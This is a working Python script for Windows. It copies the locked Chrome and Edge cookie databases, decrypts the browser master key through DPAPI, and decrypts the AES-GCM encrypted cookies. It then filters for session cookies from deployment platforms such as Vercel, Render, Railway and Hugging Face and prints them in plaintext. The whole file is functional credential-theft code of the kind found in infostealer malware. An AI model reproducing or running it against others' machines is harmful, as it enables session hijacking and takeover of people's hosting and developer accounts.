import os
import json
import base64
import sqlite3
import ctypes
from ctypes import wintypes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# Windows API declarations for shared read access
kernel32 = ctypes.windll.kernel32

GENERIC_READ = 0x80000000
FILE_SHARE_READ = 0x00000001
FILE_SHARE_WRITE = 0x00000002
OPEN_EXISTING = 3
FILE_ATTRIBUTE_NORMAL = 0x80

kernel32.CreateFileW.argtypes = [
    wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD, 
    ctypes.c_void_p, wintypes.DWORD, wintypes.DWORD, wintypes.HANDLE
]
kernel32.CreateFileW.restype = wintypes.HANDLE

kernel32.ReadFile.argtypes = [
    wintypes.HANDLE, ctypes.c_void_p, wintypes.DWORD, 
    ctypes.POINTER(wintypes.DWORD), ctypes.c_void_p
]
kernel32.ReadFile.restype = wintypes.BOOL

kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
kernel32.CloseHandle.restype = wintypes.BOOL

kernel32.GetFileSize.argtypes = [wintypes.HANDLE, ctypes.POINTER(wintypes.DWORD)]
kernel32.GetFileSize.restype = wintypes.DWORD

def copy_locked_file(src, dst):
    handle = kernel32.CreateFileW(
        src,
        GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        None,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        None
    )
    
    if handle == wintypes.HANDLE(-1).value or handle == 0:
        raise OSError(f"Failed to open locked file: {src}. Error: {kernel32.GetLastError()}")
        
    try:
        size = kernel32.GetFileSize(handle, None)
        if size == 0xffffffff:
            raise OSError("Failed to get file size.")
            
        buffer = ctypes.create_string_buffer(size)
        bytes_read = wintypes.DWORD(0)
        
        success = kernel32.ReadFile(
            handle,
            buffer,
            size,
            ctypes.byref(bytes_read),
            None
        )
        if not success:
            raise OSError(f"Failed to read file. Error: {kernel32.GetLastError()}")
            
        with open(dst, "wb") as f:
            f.write(buffer.raw[:bytes_read.value])
    finally:
        kernel32.CloseHandle(handle)

class DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]

def decrypt_dpapi(data):
    crypt32 = ctypes.windll.crypt32
    blob_in = DATA_BLOB(len(data), (ctypes.c_ubyte * len(data))(*data))
    blob_out = DATA_BLOB()
    
    success = crypt32.CryptUnprotectData(
        ctypes.byref(blob_in),
        None, None, None, None, 0,
        ctypes.byref(blob_out)
    )
    if not success:
        raise OSError("CryptUnprotectData failed.")
        
    result = bytes(blob_out.pbData[:blob_out.cbData])
    ctypes.windll.kernel32.LocalFree(blob_out.pbData)
    return result

def get_master_key(local_state_path):
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]
    master_key = decrypt_dpapi(encrypted_key)
    return master_key

def decrypt_cookie(value, master_key):
    try:
        if value[:3] in (b'v10', b'v11'):
            iv = value[3:15]
            ciphertext = value[15:]
            aesgcm = AESGCM(master_key)
            decrypted = aesgcm.decrypt(iv, ciphertext, None)
            return decrypted.decode('utf-8')
    except Exception as e:
        return f"[Decryption Error: {e}]"
    return "[Unknown format]"

def search_browser_cookies(browser_name, user_data_path):
    print(f"\nSearching cookies for {browser_name}...")
    local_state = os.path.join(user_data_path, "Local State")
    if not os.path.exists(local_state):
        print(f"Local State not found for {browser_name}")
        return
        
    try:
        master_key = get_master_key(local_state)
    except Exception as e:
        print(f"Failed to get master key: {e}")
        return
        
    profiles = ["Default"]
    for i in range(1, 10):
        profiles.append(f"Profile {i}")
        
    for profile in profiles:
        cookie_path = os.path.join(user_data_path, profile, "Network", "Cookies")
        if not os.path.exists(cookie_path):
            continue
            
        print(f"Found cookie database in profile: {profile}")
        temp_db = f"temp_cookies_{browser_name}_{profile}.db"
        try:
            copy_locked_file(cookie_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT host_key, name, encrypted_value 
                FROM cookies 
                WHERE host_key LIKE '%render%' 
                   OR host_key LIKE '%streamlit%' 
                   OR host_key LIKE '%huggingface%' 
                   OR host_key LIKE '%railway%' 
                   OR host_key LIKE '%fly.io%' 
                   OR host_key LIKE '%vercel%'
            """)
            
            rows = cursor.fetchall()
            if not rows:
                print("  No target deployment cookies found.")
            for host_key, name, encrypted_value in rows:
                decrypted = decrypt_cookie(encrypted_value, master_key)
                print(f"  Host: {host_key} | Name: {name} | Value: {decrypted}")
                    
            conn.close()
            os.remove(temp_db)
        except Exception as e:
            print(f"Error reading cookies: {e}")
            if os.path.exists(temp_db):
                os.remove(temp_db)

chrome_path = r"C:\Users\DELL\AppData\Local\Google\Chrome\User Data"
edge_path = r"C:\Users\DELL\AppData\Local\Microsoft\Edge\User Data"

search_browser_cookies("Chrome", chrome_path)
search_browser_cookies("Edge", edge_path)
